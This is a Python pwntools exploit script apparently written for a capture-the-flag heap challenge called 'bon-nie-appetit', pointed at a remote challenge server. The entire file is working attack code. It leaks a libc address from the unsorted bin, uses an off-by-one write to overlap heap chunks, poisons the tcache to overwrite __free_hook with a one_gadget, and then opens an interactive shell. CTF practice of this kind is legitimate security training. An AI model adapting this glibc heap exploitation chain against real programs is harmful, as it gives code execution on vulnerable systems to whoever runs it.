#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bon-nie-appetit'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '206.189.24.162', 30454

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def alloc(size, content):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'many:', str(size).encode())
    io.sendafter(b'order:', content)
    
def view(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'order:', str(idx).encode())

def edit(idx, content):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'order:', str(idx).encode())
    io.sendafter(b'order:', content)

def free(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'order:', str(idx).encode())
    
def exit():
    io.sendlineafter(b'>', b'5')

def exploit():
    global io
    io = initialize()
    
    # filling unsorted bin to leak main_arena
    alloc(1350, b'A')           # idx 0
    alloc(0x10, b'defense')     # idx 1
    free(0)
    
    # leaking main_arena
    alloc(1350, b'\n')          # idx 0
    view(0)
    
    # leaked main_arena
    io.recvuntil(b'Order[0] => ')
    main_arena = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = main_arena - 0x3ebc0a
    
    # off-by-one to create overlapping chunk
    alloc(0x28, b'A' * 0x28)    # idx 2
    alloc(0x18, b'B' * 0x18)    # idx 3
    alloc(0x28, b'C' * 0x28)    # idx 4
    
    # corrupting idx 3's size
    edit(2, b'B' * 0x28 + b'\x31')
    
    # inserting idx 2-4 chunk to tcache of 0x30 (though idx 3 should've been 0x20 before corrupted)
    free(2)
    free(4)
    free(3)
    
    # corrupting tcache fd to gain arbitrary write
    payload = b'B' * 0x18 + p64(0x31) + p64(libc.sym['__free_hook']) 
    alloc(0x28, payload)           # idx 2
    alloc(0x28, b'C' * 0x28)       # idx 3
    
    # overwriting __free_hook
    one_gadgets = [0x4f2a5, 0x4f302, 0x10a2fc]
    alloc(0x28, p64(libc.address + one_gadgets[1])) # idx 4

    # triggering __free_hook
    free(3)

    info('main arena: %#x', main_arena)
    info('glibc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()